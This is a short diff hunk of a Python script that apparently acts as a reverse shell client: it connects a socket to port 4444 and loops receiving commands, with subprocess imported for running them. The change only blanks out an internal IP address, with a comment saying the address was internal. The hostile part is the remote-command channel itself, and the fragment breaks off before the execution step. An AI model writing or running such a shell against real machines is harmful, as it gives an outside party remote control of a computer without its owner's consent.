@@ -3,7 +3,7 @@ import subprocess
 import os
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect(("192.168.129.133", 4444))
+client.connect(("", 4444)) # I removed the ip, not that it would matter a whole lot since it was internal
 
 while True:
     command = client.recv(1024).decode()
